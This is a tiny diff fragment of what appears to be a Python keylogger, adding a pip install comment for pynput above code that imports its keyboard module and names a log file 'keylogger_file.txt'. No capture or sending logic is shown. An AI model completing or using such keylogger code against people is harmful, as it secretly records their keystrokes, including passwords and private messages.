@@ -1,3 +1,5 @@
+#pip3 install pynput ("JanganLupa!!!!!")
+
 from pynput import keyboard
 
 LOG_FILE = "keylogger_file.txt"
